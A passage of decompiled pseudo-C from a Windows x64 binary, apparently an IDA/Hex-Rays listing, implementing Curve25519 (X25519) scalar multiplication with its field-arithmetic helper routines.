  __int128 v144[10]; // [rsp+530h] [rbp-648h] BYREF
  __int64 v145[10]; // [rsp+5D0h] [rbp-5A8h] BYREF
  int v146[40]; // [rsp+620h] [rbp-558h] BYREF
  int v147[40]; // [rsp+6C0h] [rbp-4B8h] BYREF
  int v148[40]; // [rsp+760h] [rbp-418h] BYREF
  __int64 v149; // [rsp+800h] [rbp-378h] BYREF
  char v150; // [rsp+8A0h] [rbp-2D8h] BYREF
  __int64 Val; // [rsp+940h] [rbp-238h] BYREF
  char v152; // [rsp+9E0h] [rbp-198h] BYREF
  char v153; // [rsp+A80h] [rbp-F8h] BYREF
  __m128 v154; // [rsp+B20h] [rbp-58h]

  v154 = a7;
  v131 = a11;
  v133 = _mm_loadu_si128(a10);
  v134 = _mm_loadu_si128(a10 + 1);
  v136 = v133;
  v133.m128i_i8[0] &= 0xF8u;
  v137 = v134;
  v134.m128i_i8[15] = v134.m128i_i8[15] & 0x3F | 0x40;
  v12 = *((unsigned __int8 *)a12 + 3);
  v135[0] = *a12 | ((unsigned __int64)*((unsigned __int8 *)a12 + 2) << 16) | ((unsigned __int64)(*((_BYTE *)a12 + 3) & 3) << 24);
  v13 = *((unsigned __int8 *)a12 + 6);
  v135[1] = ((v12 | (*((unsigned __int8 *)a12 + 4) << 8) | (*((unsigned __int8 *)a12 + 5) << 16) | (unsigned int)(v13 << 24)) >> 2) & 0x1FFFFFF;
  v14 = *((unsigned __int8 *)a12 + 9);
  v135[2] = ((v13 | (*((unsigned __int8 *)a12 + 7) << 8) | (*((unsigned __int8 *)a12 + 8) << 16) | (unsigned int)(v14 << 24)) >> 3) & 0x3FFFFFF;
  v15 = *((unsigned __int8 *)a12 + 12);
  v135[3] = ((v14 | (*((unsigned __int8 *)a12 + 10) << 8) | (*((unsigned __int8 *)a12 + 11) << 16) | (unsigned int)(v15 << 24)) >> 5) & 0x1FFFFFF;
  v135[4] = (unsigned int)(v15 | (*((unsigned __int8 *)a12 + 13) << 8) | (*((unsigned __int8 *)a12 + 14) << 16) | (*((unsigned __int8 *)a12 + 15) << 24)) >> 6;
  v16 = *((unsigned __int8 *)a12 + 19);
  v135[5] = a12[8] | ((unsigned __int64)*((unsigned __int8 *)a12 + 18) << 16) | ((unsigned __int64)(*((_BYTE *)a12 + 19) & 1) << 24);
  v17 = *((unsigned __int8 *)a12 + 22);
  v135[6] = ((v16 | (*((unsigned __int8 *)a12 + 20) << 8) | (*((unsigned __int8 *)a12 + 21) << 16) | (unsigned int)(v17 << 24)) >> 1) & 0x3FFFFFF;
  v18 = *((unsigned __int8 *)a12 + 25);
  v135[7] = ((v17 | (*((unsigned __int8 *)a12 + 23) << 8) | (*((unsigned __int8 *)a12 + 24) << 16) | (unsigned int)(v18 << 24)) >> 3) & 0x1FFFFFF;
  v19 = *((unsigned __int8 *)a12 + 28);
  v135[8] = ((v18 | (*((unsigned __int8 *)a12 + 26) << 8) | (*((unsigned __int8 *)a12 + 27) << 16) | (unsigned int)(v19 << 24)) >> 4) & 0x3FFFFFF;
  v135[9] = ((unsigned int)(v19 | (*((unsigned __int8 *)a12 + 29) << 8) | (*((unsigned __int8 *)a12 + 30) << 16) | (*((unsigned __int8 *)a12 + 31) << 24)) >> 6) & 0x1FFFFFF;
  v20 = v142;
  v21 = v143;
  *(_QWORD *)v143 = 1LL;
  v22 = v148;
  *(_QWORD *)v148 = 1LL;
  v23 = &v153;
  v24 = &v152;
  p_Val = (int *)&Val;
  Val = 1LL;
  v26 = (int *)&v150;
  v27 = (int *)&v149;
  v149 = 1LL;
  LODWORD(v121[0]) = 0;
  do
  {
    *((_BYTE *)v142 + SLODWORD(v121[0])) = *((_BYTE *)v135 + SLODWORD(v121[0]));
    ++LODWORD(v121[0]);
  }
  while ( LODWORD(v121[0]) < 0x50 );
  v28 = 0LL;
  do
  {
    v132 = v28;
    v29 = ((_BYTE *)&v133 - v28)[31];
    v30 = v20;
    v31 = 0;
    v32 = v27;
    v33 = v26;
    v34 = p_Val;
    do
    {
      v26 = v22;
      v27 = (int *)v23;
      p_Val = v21;
      v20 = (int *)v24;
      v21 = v34;
      v22 = v33;
      v23 = (char *)v32;
      v24 = (char *)v30;
      v35 = _mm_shuffle_epi32(_mm_cvtsi32_si128(-(v29 >> 7)), 80);
      for ( i = 0LL; i != 10; i += 2LL )
      {
        v37 = _mm_loadu_si128((const __m128i *)&v26[2 * i]);
        v38 = _mm_shuffle_epi32(v37, 232);
        v39 = _mm_loadu_si128((const __m128i *)&v30[2 * i]);
        v40 = _mm_and_si128(_mm_shuffle_epi32(_mm_xor_si128(v37, v39), 232), v35);
        v41 = _mm_xor_si128(v38, v40);
        *(__m128i *)&v26[2 * i] = _mm_unpacklo_epi32(v41, _mm_cmpgt_epi32((__m128i)0LL, v41));
        v42 = _mm_xor_si128(_mm_shuffle_epi32(v39, 232), v40);
        *(__m128i *)&v30[2 * i] = _mm_unpacklo_epi32(v42, _mm_cmpgt_epi32((__m128i)0LL, v42));
      }
      for ( j = 0LL; j != 10; j += 2LL )
      {
        v44 = _mm_loadu_si128((const __m128i *)&v27[2 * j]);
        v45 = _mm_shuffle_epi32(v44, 232);
        v46 = _mm_loadu_si128((const __m128i *)&p_Val[2 * j]);
        v47 = _mm_and_si128(_mm_shuffle_epi32(_mm_xor_si128(v44, v46), 232), v35);
        v48 = _mm_xor_si128(v45, v47);
        *(__m128i *)&v27[2 * j] = _mm_unpacklo_epi32(v48, _mm_cmpgt_epi32((__m128i)0LL, v48));
        v49 = _mm_xor_si128(_mm_shuffle_epi32(v46, 232), v47);
        *(__m128i *)&p_Val[2 * j] = _mm_unpacklo_epi32(v49, _mm_cmpgt_epi32((__m128i)0LL, v49));
      }
      LODWORD(v121[0]) = 0;
      do
      {
        *((_BYTE *)v145 + SLODWORD(v121[0])) = *((_BYTE *)v26 + SLODWORD(v121[0]));
        ++LODWORD(v121[0]);
      }
      while ( LODWORD(v121[0]) < 0x50 );
      v50 = -2LL;
      do
      {
        *(__m128i *)&v26[2 * v50 + 4] = _mm_add_epi64(
                                          _mm_loadu_si128((const __m128i *)&v27[2 * v50 + 4]),
                                          _mm_loadu_si128((const __m128i *)&v26[2 * v50 + 4]));
        v50 += 2LL;
      }
      while ( v50 < 8 );
      for ( k = 0LL; k != 10; ++k )
        *(_QWORD *)&v27[2 * k] = v145[k] - *(_QWORD *)&v27[2 * k];
      LODWORD(v121[0]) = 0;
      do
      {
        *((_BYTE *)v141 + SLODWORD(v121[0])) = *((_BYTE *)v30 + SLODWORD(v121[0]));
        ++LODWORD(v121[0]);
      }
      while ( LODWORD(v121[0]) < 0x50 );
      v52 = -2LL;
      do
      {
        *(__m128i *)&v30[2 * v52 + 4] = _mm_add_epi64(
                                          _mm_loadu_si128((const __m128i *)&p_Val[2 * v52 + 4]),
                                          _mm_loadu_si128((const __m128i *)&v30[2 * v52 + 4]));
        v52 += 2LL;
      }
      while ( v52 < 8 );
      v120 = v31;
      v119 = v29;
      for ( m = 0LL; m != 10; ++m )
        *(_QWORD *)&p_Val[2 * m] = *((_QWORD *)v141 + m) - *(_QWORD *)&p_Val[2 * m];
      sub_14000B10A((__int64)v27, (__int64)p_Val, v30, v140, v27);
      sub_14000B10A((__int64)v27, (__int64)p_Val, v26, v139, p_Val);
      sub_14000B6F9((__int64)v27, (__int64)p_Val, v54, v140);
      sub_14000B7B5((__int64)v27, (__int64)p_Val, v55, v140);
      sub_14000B6F9((__int64)v27, (__int64)p_Val, v56, (__int64 *)v139);
      sub_14000B7B5((__int64)v27, (__int64)p_Val, v57, (__int64 *)v139);
      LODWORD(v121[0]) = 0;
      do
      {
        *((_BYTE *)v141 + SLODWORD(v121[0])) = *((_BYTE *)v140 + SLODWORD(v121[0]));
        ++LODWORD(v121[0]);
      }
      while ( LODWORD(v121[0]) < 0x50 );
      v58 = 0x7FFFFFFFFFFFFFFFLL;
      do
      {
        *(__m128i *)&v140[v58 * 2 + 2] = _mm_add_epi64(
                                           _mm_load_si128((const __m128i *)&v139[v58 + 1]),
                                           *(__m128i *)&v140[v58 * 2 + 2]);
        ++v58;
      }
      while ( v58 < 4 );
      for ( n = 0LL; n != 5; ++n )
        v139[n] = (__int128)_mm_sub_epi64(_mm_load_si128((const __m128i *)&v141[n]), (__m128i)v139[n]);
      sub_14000B867((__int64)v27, (__int64)p_Val, (int *)v140, (__int64)v147);
      sub_14000B867((__int64)v27, (__int64)p_Val, (int *)v139, (__int64)v146);
      sub_14000B10A((__int64)v27, (__int64)p_Val, v146, v139, (int *)v135);
      sub_14000B6F9((__int64)v27, (__int64)p_Val, v60, (__int64 *)v139);
      sub_14000B7B5((__int64)v27, (__int64)p_Val, v61, (__int64 *)v139);
      LODWORD(v121[0]) = 0;
      do
      {
        *((_BYTE *)v20 + SLODWORD(v121[0])) = *((_BYTE *)v147 + SLODWORD(v121[0]));
        ++LODWORD(v121[0]);
      }
      while ( LODWORD(v121[0]) < 0x50 );
      LODWORD(v121[0]) = 0;
      do
      {
        *((_BYTE *)v21 + SLODWORD(v121[0])) = *((_BYTE *)v139 + SLODWORD(v121[0]));
        ++LODWORD(v121[0]);
      }
      while ( LODWORD(v121[0]) < 0x50 );
      sub_14000B867((__int64)v27, (__int64)p_Val, v26, (__int64)&nn);
      sub_14000B867((__int64)v27, (__int64)p_Val, v27, (__int64)v144);
      sub_14000B10A((__int64)v27, (__int64)p_Val, (int *)&nn, v22, (int *)v144);
      sub_14000B6F9((__int64)v27, (__int64)p_Val, v62, (__int64 *)v22);
      sub_14000B7B5((__int64)v27, (__int64)p_Val, v63, (__int64 *)v22);
      for ( ii = 0LL; ii != 5; ++ii )
        v144[ii] = (__int128)_mm_sub_epi64(_mm_load_si128((const __m128i *)(&nn + 1 * ii)), (__m128i)v144[ii]);
      v138[0] = 0;
      do
        *((_BYTE *)&v121[5] + v138[0]++) = 0;
      while ( v138[0] < 0x48u );
      for ( jj = 0LL; jj != 10; ++jj )
        *((_QWORD *)v121 + jj) = 121665LL * *((_QWORD *)v144 + jj);
      sub_14000B7B5((__int64)v27, (__int64)p_Val, v64, (__int64 *)v121);
      v67 = 0x7FFFFFFFFFFFFFFFLL;
      do
      {
        v121[v67 + 1] = (__int128)_mm_add_epi64(
                                    _mm_load_si128((const __m128i *)(&v125 + 1 * v67)),
                                    (__m128i)v121[v67 + 1]);
        ++v67;
      }
      while ( v67 < 4 );
      sub_14000B10A((__int64)v27, (__int64)p_Val, (int *)v144, v23, (int *)v121);
      sub_14000B6F9((__int64)v27, (__int64)p_Val, v68, (__int64 *)v23);
      sub_14000B7B5((__int64)v27, (__int64)p_Val, v69, (__int64 *)v23);
      for ( kk = 0LL; kk != 10; kk += 2LL )
      {
        v71 = _mm_loadu_si128((const __m128i *)&v22[2 * kk]);
        v72 = _mm_shuffle_epi32(v71, 232);
        v73 = _mm_loadu_si128((const __m128i *)&v20[2 * kk]);
        v74 = _mm_and_si128(_mm_shuffle_epi32(_mm_xor_si128(v71, v73), 232), v35);
        v75 = _mm_xor_si128(v72, v74);
        *(__m128i *)&v22[2 * kk] = _mm_unpacklo_epi32(v75, _mm_cmpgt_epi32((__m128i)0LL, v75));
        v76 = _mm_xor_si128(_mm_shuffle_epi32(v73, 232), v74);
        *(__m128i *)&v20[2 * kk] = _mm_unpacklo_epi32(v76, _mm_cmpgt_epi32((__m128i)0LL, v76));
      }
      for ( mm = 0LL; mm != 10; mm += 2LL )
      {
        v78 = _mm_loadu_si128((const __m128i *)&v23[8 * mm]);
        v79 = _mm_shuffle_epi32(v78, 232);
        v80 = _mm_loadu_si128((const __m128i *)&v21[2 * mm]);
        v81 = _mm_and_si128(_mm_shuffle_epi32(_mm_xor_si128(v78, v80), 232), v35);
        v82 = _mm_xor_si128(v79, v81);
        *(__m128i *)&v23[8 * mm] = _mm_unpacklo_epi32(v82, _mm_cmpgt_epi32((__m128i)0LL, v82));
        v83 = _mm_xor_si128(_mm_shuffle_epi32(v80, 232), v81);
        *(__m128i *)&v21[2 * mm] = _mm_unpacklo_epi32(v83, _mm_cmpgt_epi32((__m128i)0LL, v83));
      }
      v29 = 2 * v119;
      v31 = v120 + 1;
      v30 = v20;
      v32 = v27;
      v33 = v26;
      v34 = p_Val;
    }
    while ( v120 != 7 );
    v28 = v132 + 1;
  }
  while ( v132 != 31 );
  LODWORD(v121[0]) = 0;
  do
  {
    *((_BYTE *)v138 + SLODWORD(v121[0])) = *((_BYTE *)v22 + SLODWORD(v121[0]));
    ++LODWORD(v121[0]);
  }
  while ( LODWORD(v121[0]) < 0x50 );
  for ( nn = 0; nn < 0x50; ++nn )
    *((_BYTE *)v121 + (int)nn) = v23[nn];
  sub_14000B867((__int64)v27, (__int64)p_Val, (int *)v121, (__int64)v145);
  sub_14000B867((__int64)v27, (__int64)v143, (int *)v145, (__int64)v143);
  sub_14000B867((__int64)v142, (__int64)v143, v143, (__int64)v142);
  sub_14000BB67((__int64)v142, (__int64)v143, v142, (__int64)v141, (int *)v121);
  sub_14000BB67((__int64)v142, (__int64)v143, (int *)v141, (__int64)&nn, (int *)v145);
  sub_14000B867((__int64)v142, (__int64)v143, (int *)&nn, (__int64)v142);
  sub_14000BB67((__int64)v142, (__int64)v143, v142, (__int64)v144, (int *)v141);
  sub_14000B867((__int64)v142, (__int64)v143, (int *)v144, (__int64)v142);
  sub_14000B867((__int64)v142, (__int64)v143, v142, (__int64)v143);
  sub_14000B867((__int64)v142, (__int64)v143, v143, (__int64)v142);
  sub_14000B867((__int64)v142, (__int64)v143, v142, (__int64)v143);
  sub_14000B867((__int64)v142, (__int64)v143, v143, (__int64)v142);
  sub_14000BB67((__int64)v142, (__int64)v143, v142, (__int64)v140, (int *)v144);
  sub_14000B867((__int64)v142, (__int64)v143, (int *)v140, (__int64)v142);
  sub_14000B867((__int64)v142, (__int64)v143, v142, (__int64)v143);
  for ( i1 = 0; i1 < 8; i1 += 2 )
  {
    sub_14000B867((__int64)v142, (__int64)v143, v143, (__int64)v142);
    sub_14000B867((__int64)v142, (__int64)v143, v142, (__int64)v143);
  }
  sub_14000BB67((__int64)v142, (__int64)v143, v143, (__int64)v139, (int *)v140);
  sub_14000B867((__int64)v142, (__int64)v143, (int *)v139, (__int64)v142);
  sub_14000B867((__int64)v142, (__int64)v143, v142, (__int64)v143);
  for ( i2 = 0; i2 < 0x12; i2 += 2 )
  {
    sub_14000B867((__int64)v142, (__int64)v143, v143, (__int64)v142);
    sub_14000B867((__int64)v142, (__int64)v143, v142, (__int64)v143);
  }
  sub_14000BB67((__int64)v143, (__int64)v142, v143, (__int64)v142, (int *)v139);
  sub_14000B867((__int64)v143, (__int64)v142, v142, (__int64)v143);
  sub_14000B867((__int64)v143, (__int64)v142, v143, (__int64)v142);
  for ( i3 = 0; i3 < 8; i3 += 2 )
  {
    sub_14000B867((__int64)v143, (__int64)v142, v142, (__int64)v143);
    sub_14000B867((__int64)v143, (__int64)v142, v143, (__int64)v142);
  }
  sub_14000BB67((__int64)v146, (__int64)v142, v142, (__int64)v146, (int *)v140);
  sub_14000B867((__int64)v146, (__int64)v142, v146, (__int64)v142);
  sub_14000B867((__int64)v143, (__int64)v142, v142, (__int64)v143);
  for ( i4 = 0; i4 < 0x30; i4 += 2 )
  {
    sub_14000B867((__int64)v143, (__int64)v142, v143, (__int64)v142);
    sub_14000B867((__int64)v143, (__int64)v142, v142, (__int64)v143);
  }
  sub_14000BB67((__int64)v147, (__int64)v143, v143, (__int64)v147, v146);
  sub_14000B867((__int64)v147, (__int64)v143, v147, (__int64)v143);
  sub_14000B867((__int64)v142, (__int64)v143, v143, (__int64)v142);
  for ( i5 = 0; i5 < 0x62; i5 += 2 )
  {
    sub_14000B867((__int64)v142, (__int64)v143, v142, (__int64)v143);
    sub_14000B867((__int64)v142, (__int64)v143, v143, (__int64)v142);
  }
  sub_14000BB67((__int64)v142, (__int64)v143, v142, (__int64)v143, v147);
  sub_14000B867((__int64)v142, (__int64)v143, v143, (__int64)v142);
  sub_14000B867((__int64)v142, (__int64)v143, v142, (__int64)v143);
  for ( i6 = 0; i6 < 0x30; i6 += 2 )
  {
    sub_14000B867((__int64)v142, (__int64)v143, v143, (__int64)v142);
    sub_14000B867((__int64)v142, (__int64)v143, v142, (__int64)v143);
  }
  sub_14000BB67((__int64)v142, (__int64)v143, v143, (__int64)v142, v146);
  sub_14000B867((__int64)v142, (__int64)v143, v142, (__int64)v143);
  sub_14000B867((__int64)v142, (__int64)v143, v143, (__int64)v142);
  sub_14000B867((__int64)v142, (__int64)v143, v142, (__int64)v143);
  sub_14000B867((__int64)v142, (__int64)v143, v143, (__int64)v142);
  sub_14000B867((__int64)v142, (__int64)v143, v142, (__int64)v143);
  sub_14000BB67((__int64)v148, (__int64)v143, v143, (__int64)v148, (int *)&nn);
  sub_14000BB67((__int64)v148, (__int64)v143, v138, (__int64)v121, v148);
  for ( i7 = 0LL; i7 != 5; ++i7 )
    *(_QWORD *)(&nn + i7 * 2) = _mm_shuffle_epi32((__m128i)v121[i7], 232).m128i_u64[0];
  v91 = 1;
  v92 = nn;
  do
  {
    for ( i8 = 0LL; i8 != 9; ++i8 )
    {
      v94 = v92 & (v92 >> 31);
      *(&nn + i8) = v92 - (v94 & (((unsigned __int8)i8 | 0xFFFFFFFE) << 25));
      v95 = *((_DWORD *)&v123 + i8) + (v94 >> (26 - (i8 & 1)));
      *((_DWORD *)&v123 + i8) = v95;
      v92 = v95;
    }
    v96 = (v130 & (v130 >> 31)) >> 25;
    v130 -= v130 & (v130 >> 31) & 0xFE000000;
    v92 = nn + 19 * v96;
    nn = v92;
    v97 = (v91 & 1) == 0;
    v91 = 0;
  }
  while ( !v97 );
  v98 = (v92 & (v92 >> 31)) >> 26;
  v99 = v92 - (v92 & (v92 >> 31) & 0xFC000000);
  nn = v99;
  LODWORD(v123) = v98 + v123;
  v100 = 1;
  do
  {
    for ( i9 = 0LL; i9 != 9; ++i9 )
    {
      v102 = i9 & 1;
      *(&nn + i9) = v99 & (((v102 == 0) << 25) | 0x1FFFFFF);
      v99 = *((_DWORD *)&v123 + i9) + (v99 >> (26 - v102));
      *((_DWORD *)&v123 + i9) = v99;
    }
    v103 = v130 >> 25;
    v130 &= 0x1FFFFFFu;
    v99 = nn + 19 * v103;
    nn = v99;
    v97 = (v100 & 1) == 0;
    v100 = 0;
  }
  while ( !v97 );
  v104 = ~((v99 - 67108845) >> 31);
  for ( i10 = 1LL; i10 != 10; ++i10 )
  {
    v106 = (*(&nn + i10) ^ (((unsigned __int8)i10 | 0xFFFFFFFE) << 25)) & (*(&nn + i10) << 16);
    v107 = v106 & (v106 << 8) & (16 * (v106 & (v106 << 8)));
    v104 &= (v107 & (4 * v107) & (2 * (v107 & (4 * v107)))) >> 31;
  }
  v108 = v99 - (v104 & 0x3FFFFED);
  nn = v108;
  for ( i11 = 1LL; i11 != 10; ++i11 )
    *(&nn + i11) -= v104 & ((((i11 & 1) == 0) << 25) | 0x1FFFFFF);
  v110 = v123;
  v111 = v124;
  v112 = v125;
  v113 = v128;
  v114 = v129;
  v115 = v130;
  v116 = v131;
  *v131 = v108;
  *((_BYTE *)v116 + 2) = BYTE2(v108);
  *((_BYTE *)v116 + 3) = (4 * v110) | HIBYTE(v108);
  *((_BYTE *)v116 + 4) = (unsigned int)v110 >> 6;
  *((_BYTE *)v116 + 5) = (unsigned int)v110 >> 14;
  *((_BYTE *)v116 + 6) = (8 * BYTE4(v110)) | ((unsigned int)v110 >> 22);
  *((_BYTE *)v116 + 7) = HIDWORD(v110) >> 5;
  *((_BYTE *)v116 + 8) = HIDWORD(v110) >> 13;
  *((_BYTE *)v116 + 9) = (32 * v111) | (HIDWORD(v110) >> 21);
  *((_BYTE *)v116 + 10) = v111 >> 3;
  *((_BYTE *)v116 + 11) = v111 >> 11;
  *((_BYTE *)v116 + 12) = ((_BYTE)v112 << 6) | (v111 >> 19);
  *((_BYTE *)v116 + 13) = v112 >> 2;
  *((_BYTE *)v116 + 14) = v112 >> 10;
  *((_BYTE *)v116 + 15) = v112 >> 18;
  v117 = v127;
  v116[8] = v126;
  *((_BYTE *)v116 + 18) = v117;
  *((_BYTE *)v116 + 19) = (2 * v113) | HIBYTE(v117);
  *((_BYTE *)v116 + 20) = (unsigned int)v113 >> 7;
  *((_BYTE *)v116 + 21) = (unsigned int)v113 >> 15;
  *((_BYTE *)v116 + 22) = (8 * BYTE4(v113)) | ((unsigned int)v113 >> 23);
  *((_BYTE *)v116 + 23) = HIDWORD(v113) >> 5;
  *((_BYTE *)v116 + 24) = HIDWORD(v113) >> 13;
  *((_BYTE *)v116 + 25) = (16 * v114) | (HIDWORD(v113) >> 21);
  *((_BYTE *)v116 + 26) = v114 >> 4;
  *((_BYTE *)v116 + 27) = v114 >> 12;
  *((_BYTE *)v116 + 28) = ((_BYTE)v115 << 6) | (v114 >> 20);
  *((_BYTE *)v116 + 29) = v115 >> 2;
  result = v115 >> 10;
  *((_BYTE *)v116 + 30) = result;
  *((_BYTE *)v116 + 31) = v115 >> 18;
  return result;
}
// 14000A635: variable 'v54' is possibly undefined
// 14000A642: variable 'v55' is possibly undefined
// 14000A64F: variable 'v56' is possibly undefined
// 14000A65C: variable 'v57' is possibly undefined
// 14000A739: variable 'v60' is possibly undefined
// 14000A746: variable 'v61' is possibly undefined
// 14000A7ED: variable 'v62' is possibly undefined
// 14000A7F5: variable 'v63' is possibly undefined
// 14000A87C: variable 'v64' is possibly undefined
// 14000A8BF: variable 'v68' is possibly undefined
// 14000A8C7: variable 'v69' is possibly undefined
// 14000A0C7: using guessed type int var_6E8[40];
// 14000A0C7: using guessed type int var_418[40];
// 14000A0C7: using guessed type int var_558[40];

//----- (000000014000B10A) ----------------------------------------------------
__int64 __fastcall sub_14000B10A(__int64 a1, __int64 a2, int *a3, _QWORD *a4, int *a5)
{
  __int64 result; // rax

  *a4 = *a3 * (__int64)*a5;
  a4[1] = *a3 * (__int64)a5[2] + a3[2] * (__int64)*a5;
  a4[2] = *a3 * (__int64)a5[4] + 2 * a3[2] * (__int64)a5[2] + a3[4] * (__int64)*a5;
  a4[3] = a3[2] * (__int64)a5[4] + a3[4] * (__int64)a5[2] + *a3 * (__int64)a5[6] + a3[6] * (__int64)*a5;
  a4[4] = a3[4] * (__int64)a5[4]
        + 2 * (a3[2] * (__int64)a5[6] + a3[6] * (__int64)a5[2])
        + *a3 * (__int64)a5[8]
        + a3[8] * (__int64)*a5;
  a4[5] = a3[4] * (__int64)a5[6]
        + a3[6] * (__int64)a5[4]
        + a3[2] * (__int64)a5[8]
        + a3[8] * (__int64)a5[2]
        + *a3 * (__int64)a5[10]
        + a3[10] * (__int64)*a5;
  a4[6] = a3[4] * (__int64)a5[8]
        + 2 * (a3[6] * (__int64)a5[6] + a3[2] * (__int64)a5[10] + a3[10] * (__int64)a5[2])
        + a3[8] * (__int64)a5[4]
        + *a3 * (__int64)a5[12]
        + a3[12] * (__int64)*a5;
  a4[7] = a3[6] * (__int64)a5[8]
        + a3[8] * (__int64)a5[6]
        + a3[4] * (__int64)a5[10]
        + a3[10] * (__int64)a5[4]
        + a3[2] * (__int64)a5[12]
        + a3[12] * (__int64)a5[2]
        + *a3 * (__int64)a5[14]
        + a3[14] * (__int64)*a5;
  a4[8] = a3[8] * (__int64)a5[8]
        + 2 * (a3[6] * (__int64)a5[10] + a3[10] * (__int64)a5[6] + a3[2] * (__int64)a5[14] + a3[14] * (__int64)a5[2])
        + a3[4] * (__int64)a5[12]
        + a3[12] * (__int64)a5[4]
        + *a3 * (__int64)a5[16]
        + a3[16] * (__int64)*a5;
  a4[9] = a3[8] * (__int64)a5[10]
        + a3[10] * (__int64)a5[8]
        + a3[6] * (__int64)a5[12]
        + a3[12] * (__int64)a5[6]
        + a3[4] * (__int64)a5[14]
        + a3[14] * (__int64)a5[4]
        + a3[2] * (__int64)a5[16]
        + a3[16] * (__int64)a5[2]
        + *a3 * (__int64)a5[18]
        + a3[18] * (__int64)*a5;
  a4[10] = a3[8] * (__int64)a5[12]
         + 2
         * (a3[10] * (__int64)a5[10]
          + a3[6] * (__int64)a5[14]
          + a3[14] * (__int64)a5[6]
          + a3[2] * (__int64)a5[18]
          + a3[18] * (__int64)a5[2])
         + a3[12] * (__int64)a5[8]
         + a3[4] * (__int64)a5[16]
         + a3[16] * (__int64)a5[4];
  a4[11] = a3[10] * (__int64)a5[12]
         + a3[12] * (__int64)a5[10]
         + a3[8] * (__int64)a5[14]
         + a3[14] * (__int64)a5[8]
         + a3[6] * (__int64)a5[16]
         + a3[16] * (__int64)a5[6]
         + a3[4] * (__int64)a5[18]
         + a3[18] * (__int64)a5[4];
  a4[12] = a3[12] * (__int64)a5[12]
         + 2 * (a3[10] * (__int64)a5[14] + a3[14] * (__int64)a5[10] + a3[6] * (__int64)a5[18] + a3[18] * (__int64)a5[6])
         + a3[8] * (__int64)a5[16]
         + a3[16] * (__int64)a5[8];
  a4[13] = a3[12] * (__int64)a5[14]
         + a3[14] * (__int64)a5[12]
         + a3[10] * (__int64)a5[16]
         + a3[16] * (__int64)a5[10]
         + a3[8] * (__int64)a5[18]
         + a3[18] * (__int64)a5[8];
  a4[14] = a3[12] * (__int64)a5[16]
         + 2 * (a3[14] * (__int64)a5[14] + a3[10] * (__int64)a5[18] + a3[18] * (__int64)a5[10])
         + a3[16] * (__int64)a5[12];
  a4[15] = a3[14] * (__int64)a5[16] + a3[16] * (__int64)a5[14] + a3[12] * (__int64)a5[18] + a3[18] * (__int64)a5[12];
  a4[16] = a3[16] * (__int64)a5[16] + 2 * (a3[14] * (__int64)a5[18] + a3[18] * (__int64)a5[14]);
  a4[17] = a3[16] * (__int64)a5[18] + a3[18] * (__int64)a5[16];
  result = a3[18];
  a4[18] = 2 * result * a5[18];
  return result;
}

//----- (000000014000B6F9) ----------------------------------------------------
__int64 __fastcall sub_14000B6F9(__int64 a1, __int64 a2, __int64 a3, __int64 *a4)
{
  __int64 v4; // rax
  __int64 result; // rax

  a4[8] += a4[18] + 18 * a4[18];
  a4[7] += a4[17] + 18 * a4[17];
  a4[6] += a4[16] + 18 * a4[16];
  a4[5] += a4[15] + 18 * a4[15];
  v4 = a4[13];
  a4[4] += a4[14] + 18 * a4[14];
  a4[3] += v4 + 18 * v4;
  a4[2] += a4[12] + 18 * a4[12];
  a4[1] += a4[11] + 18 * a4[11];
  result = *a4 + a4[10] + 18 * a4[10];
  *a4 = result;
  return result;
}

//----- (000000014000B7B5) ----------------------------------------------------
__int64 __fastcall sub_14000B7B5(__int64 a1, __int64 a2, __int64 a3, __int64 *a4)
{
  __int64 v4; // rdx
  unsigned __int64 v5; // r8
  __int64 v6; // r9
  __int64 v7; // rax
  __int64 v8; // r8
  __int64 result; // rax

  a4[10] = 0LL;
  v4 = *a4;
  v5 = -2LL;
  do
  {
    a4[v5 + 2] = v4 % 0x4000000;
    v6 = a4[v5 + 3] + v4 / 0x4000000;
    a4[v5 + 3] = v6 % 0x2000000;
    v4 = a4[v5 + 4] + v6 / 0x2000000;
    a4[v5 + 4] = v4;
    v5 += 2LL;
  }
  while ( v5 < 8 );
  v7 = *a4 + a4[10] + 18 * a4[10];
  a4[10] = 0LL;
  v8 = v7 / 0x4000000;
  result = v7 % 0x4000000;
  *a4 = result;
  a4[1] += v8;
  return result;
}

//----- (000000014000B867) ----------------------------------------------------
__int64 __fastcall sub_14000B867(__int64 a1, __int64 a2, int *a3, __int64 a4)
{
  __int64 v5; // rbx
  __int64 v6; // rax
  __int64 v7; // r9
  __int64 v8; // r12
  __int64 v9; // r10
  __int64 v10; // r13
  __int64 v11; // r8
  __int64 v12; // r15
  __int64 v13; // r11
  __int64 v14; // rax
  __int64 v15; // rdx
  __int64 v16; // rdi
  __int64 v17; // rdx
  __int64 result; // rax
  unsigned int i; // [rsp+2Ch] [rbp-DCh]
  __int64 v20[18]; // [rsp+30h] [rbp-D8h] BYREF
  __int64 v21; // [rsp+C0h] [rbp-48h]

  v5 = *a3;
  v20[0] = v5 * v5;
  v6 = *((_QWORD *)a3 + 1);
  v7 = (int)v6;
  v6 <<= 32;
  v20[1] = 2 * v5 * v7;
  v8 = a3[4];
  v20[2] = 2 * (v7 * v7 + v5 * v8);
  v9 = a3[6];
  v20[3] = 2 * (v7 * v8 + v5 * v9);
  v10 = a3[8];
  v20[4] = v8 * v8 + v9 * (v6 >> 30) + v10 * 2 * v5;
  v11 = a3[10];
  v20[5] = 2 * (v8 * v9 + v7 * v10 + v5 * v11);
  v12 = a3[12];
  v20[6] = 2 * (v5 * v12 + v9 * v9 + v8 * v10 + v11 * (v6 >> 31));
  v13 = a3[14];
  v20[7] = 2 * (v9 * v10 + v8 * v11 + v7 * v12 + v5 * v13);
  v14 = a3[16];
  v20[8] = v10 * v10 + 2 * (v8 * v12 + v5 * v14 + 2 * (v7 * v13 + v9 * v11));
  v15 = a3[18];
  v20[9] = 2 * (v10 * v11 + v9 * v12 + v8 * v13 + v7 * v14 + v15 * v5);
  v16 = v9 * v13;
  v20[10] = 2 * (v11 * v11 + v10 * v12 + v8 * v14 + 2 * (v9 * v13 + v15 * v7));
  v20[11] = 2 * (v11 * v12 + v10 * v13 + v9 * v14 + v15 * v8);
  v20[12] = v12 * v12 + 2 * (v10 * v14 + 2 * (v11 * v13 + v15 * v9));
  v20[13] = 2 * (v12 * v13 + v11 * v14 + v15 * v10);
  v20[14] = 2 * (v13 * v13 + v12 * v14 + 2 * v15 * v11);
  v20[15] = 2 * (v13 * v14 + v15 * v12);
  v20[16] = v14 * v14 + 4 * v15 * v13;
  v20[17] = 2 * v15 * v14;
  v21 = 2 * v15 * v15;
  sub_14000B6F9(v9 * v13, (__int64)v20, v21, v20);
  sub_14000B7B5(v16, (__int64)v20, v17, v20);
